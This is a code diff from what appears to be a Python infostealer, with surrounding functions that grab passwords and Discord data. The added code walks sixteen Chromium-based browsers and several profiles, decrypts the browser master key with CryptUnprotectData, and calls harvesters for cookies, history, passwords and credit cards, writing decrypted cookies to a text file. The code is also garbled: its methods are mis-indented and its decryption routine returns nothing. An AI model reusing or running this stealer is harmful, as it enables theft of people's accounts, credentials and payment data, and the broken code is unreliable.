@@ -512,24 +512,91 @@ def getPassw(path, arg):
             PasswCount += 1
     writeforfile(Passw, 'passw')
 
-Cookies = []    
-def getCookie(self, name: str, path: str, profile: str) -> None:
-    path += '\\' + profile + '\\Network\\Cookies'
-    if not os.path.isfile(path):
-        return
-    copy2(path, "Cookievault.db")
-    conn = sqlite3.connect("Cookievault.db")
-    cursor = conn.cursor()
-    with open('.\\browser-cookies.txt', 'a', encoding="utf-8") as f:
-        for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
-            host_key, name, path, encrypted_value, expires_utc = res
-            value = self.decrypt_password(encrypted_value, self.masterkey)
-            if host_key and name and value != "":
-                f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
-                    host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
-        cursor.close()
-        conn.close()
-        os.remove("Cookievault.db")
+def __init__(self) -> None:
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.roaming = os.getenv('APPDATA')
+        self.browsers = {
+            'amigo': self.appdata + '\\Amigo\\User Data',
+            'torch': self.appdata + '\\Torch\\User Data',
+            'kometa': self.appdata + '\\Kometa\\User Data',
+            'orbitum': self.appdata + '\\Orbitum\\User Data',
+            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
+            '7star': self.appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': self.appdata + '\\Iridium\\User Data',
+        }
+
+        self.profiles = [
+            'Default',
+            'Profile 1',
+            'Profile 2',
+            'Profile 3',
+            'Profile 4',
+            'Profile 5',
+        ]
+
+        for name, path in self.browsers.items():
+            if not os.path.isdir(path):
+                continue
+
+            self.masterkey = self.get_master_key(path + '\\Local State')
+            self.funcs = [
+                self.cookies, 
+                self.history, 
+                self.passwords,
+                self.credit_cards
+                ]
+
+            for profile in self.profiles:
+                for func in self.funcs:
+                    try:
+                        func(name, path, profile)
+                    except:
+                        pass
+        def get_master_key(self, path: str) -> str:
+            with open(path, "r", encoding="utf-8") as f:
+                c = f.read()
+            local_state = json.loads(c)
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key = master_key[5:]
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
+
+        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+
+
+        def cookies(self, name: str, path: str, profile: str) -> None:
+            path += '\\' + profile + '\\Network\\Cookies'
+            if not os.path.isfile(path):
+                return
+            copy2(path, "Cookievault.db")
+            conn = sqlite3.connect("Cookievault.db")
+            cursor = conn.cursor()
+            with open('.\\browser-cookies.txt', 'a', encoding="utf-8") as f:
+                for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
+                    host_key, name, path, encrypted_value, expires_utc = res
+                    value = self.decrypt_password(encrypted_value, self.masterkey)
+                    if host_key and name and value != "":
+                        f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
+                            host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
+            cursor.close()
+            conn.close()
+            os.remove("Cookievault.db")
+  
+
     
 def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"): return
